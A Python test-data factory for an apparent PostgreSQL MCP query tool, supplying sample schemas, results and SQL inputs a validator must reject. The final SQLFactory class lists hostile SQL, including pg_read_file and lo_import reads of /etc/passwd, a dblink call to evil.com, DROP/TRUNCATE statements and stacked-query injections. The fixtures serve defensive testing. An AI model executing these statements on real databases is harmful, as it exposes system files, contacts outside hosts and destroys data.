"""Test data factories for pg-mcp tests."""

from pg_mcp.models import (
    ColumnInfo,
    DatabaseSchema,
    EnumTypeInfo,
    ForeignKeyRelation,
    QueryResultData,
    TableInfo,
    ValidationResult,
    ViewInfo,
)


class SchemaFactory:
    """Factory for creating test database schemas."""

    @staticmethod
    def create_simple_schema() -> DatabaseSchema:
        """Create a simple schema with one table."""
        return DatabaseSchema(
            database_name="simple_db",
            tables=[
                TableInfo(
                    schema_name="public",
                    name="items",
                    columns=[
                        ColumnInfo(name="id", data_type="integer", is_primary_key=True),
                        ColumnInfo(name="name", data_type="varchar"),
                    ],
                )
            ],
        )

    @staticmethod
    def create_complex_schema() -> DatabaseSchema:
        """Create a complex schema with multiple tables and relations."""
        return DatabaseSchema(
            database_name="complex_db",
            tables=[
                TableInfo(
                    schema_name="public",
                    name="users",
                    columns=[
                        ColumnInfo(
                            name="id",
                            data_type="integer",
                            is_nullable=False,
                            is_primary_key=True,
                        ),
                        ColumnInfo(name="name", data_type="varchar"),
                        ColumnInfo(name="email", data_type="varchar"),
                    ],
                    comment="User accounts",
                    estimated_row_count=1000,
                ),
                TableInfo(
                    schema_name="public",
                    name="orders",
                    columns=[
                        ColumnInfo(
                            name="id",
                            data_type="integer",
                            is_nullable=False,
                            is_primary_key=True,
                        ),
                        ColumnInfo(
                            name="user_id",
                            data_type="integer",
                            is_foreign_key=True,
                            foreign_table="public.users",
                            foreign_column="id",
                        ),
                        ColumnInfo(name="total", data_type="numeric"),
                        ColumnInfo(name="status", data_type="varchar"),
                    ],
                    comment="Customer orders",
                ),
                TableInfo(
                    schema_name="public",
                    name="order_items",
                    columns=[
                        ColumnInfo(name="id", data_type="integer", is_primary_key=True),
                        ColumnInfo(
                            name="order_id",
                            data_type="integer",
                            is_foreign_key=True,
                            foreign_table="public.orders",
                            foreign_column="id",
                        ),
                        ColumnInfo(name="product_id", data_type="integer"),
                        ColumnInfo(name="quantity", data_type="integer"),
                    ],
                ),
            ],
            views=[
                ViewInfo(
                    schema_name="public",
                    name="active_users",
                    columns=[
                        ColumnInfo(name="id", data_type="integer"),
                        ColumnInfo(name="name", data_type="varchar"),
                        ColumnInfo(name="email", data_type="varchar"),
                    ],
                    comment="Active users view",
                ),
            ],
            enum_types=[
                EnumTypeInfo(
                    schema_name="public",
                    name="order_status",
                    values=["pending", "processing", "completed", "cancelled"],
                ),
            ],
            foreign_key_relations=[
                ForeignKeyRelation(
                    from_table="public.orders",
                    from_columns=["user_id"],
                    to_table="public.users",
                    to_columns=["id"],
                    constraint_name="fk_orders_users",
                ),
                ForeignKeyRelation(
                    from_table="public.order_items",
                    from_columns=["order_id"],
                    to_table="public.orders",
                    to_columns=["id"],
                    constraint_name="fk_order_items_orders",
                ),
            ],
        )


class ResultFactory:
    """Factory for creating test query results."""

    @staticmethod
    def create_user_list() -> QueryResultData:
        """Create a sample user list result."""
        return QueryResultData(
            columns=["id", "name", "email"],
            rows=[
                [1, "Alice", "alice@example.com"],
                [2, "Bob", "bob@example.com"],
                [3, "Charlie", "charlie@example.com"],
            ],
            row_count=3,
            execution_time_ms=10.0,
        )

    @staticmethod
    def create_aggregate_result() -> QueryResultData:
        """Create an aggregate query result."""
        return QueryResultData(
            columns=["count", "total"],
            rows=[[100, 9999.99]],
            row_count=1,
            execution_time_ms=5.0,
        )

    @staticmethod
    def create_empty_result() -> QueryResultData:
        """Create an empty result."""
        return QueryResultData(
            columns=[],
            rows=[],
            row_count=0,
            execution_time_ms=2.0,
        )

    @staticmethod
    def create_large_result(row_count: int = 100) -> QueryResultData:
        """Create a large result set for testing."""
        return QueryResultData(
            columns=["id", "value"],
            rows=[[i, f"value_{i}"] for i in range(row_count)],
            row_count=row_count,
            execution_time_ms=50.0,
        )

    @staticmethod
    def create_with_nulls() -> QueryResultData:
        """Create a result with NULL values."""
        return QueryResultData(
            columns=["id", "name", "optional"],
            rows=[
                [1, "Alice", None],
                [2, None, "value"],
                [3, "Charlie", "data"],
            ],
            row_count=3,
            execution_time_ms=8.0,
        )


class ValidationFactory:
    """Factory for creating validation results."""

    @staticmethod
    def create_passed() -> ValidationResult:
        """Create a passed validation result."""
        return ValidationResult(passed=True, message="查询结果符合预期")

    @staticmethod
    def create_failed(reason: str = "结果不符合预期") -> ValidationResult:
        """Create a failed validation result."""
        return ValidationResult(passed=False, message=reason)


class SQLFactory:
    """Factory for creating test SQL statements."""

    # Valid SELECT statements
    VALID_SELECTS = [
        "SELECT * FROM users",
        "SELECT id, name FROM users WHERE id = 1",
        "SELECT COUNT(*) FROM orders GROUP BY user_id",
        "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
        "WITH cte AS (SELECT * FROM users) SELECT * FROM cte",
    ]

    # Invalid DML statements
    INVALID_DML = [
        "INSERT INTO users (name) VALUES ('test')",
        "UPDATE users SET name = 'test' WHERE id = 1",
        "DELETE FROM users WHERE id = 1",
    ]

    # Invalid DDL statements
    INVALID_DDL = [
        "DROP TABLE users",
        "CREATE TABLE test (id int)",
        "ALTER TABLE users ADD COLUMN x int",
        "TRUNCATE TABLE users",
    ]

    # Dangerous function calls
    DANGEROUS_FUNCTIONS = [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT * FROM dblink('host=evil.com', 'SELECT 1')",
        "SELECT lo_import('/etc/passwd')",
    ]

    # Multi-statement attacks
    MULTI_STATEMENTS = [
        "SELECT 1; DROP TABLE users",
        "SELECT * FROM users; INSERT INTO users VALUES (1)",
    ]
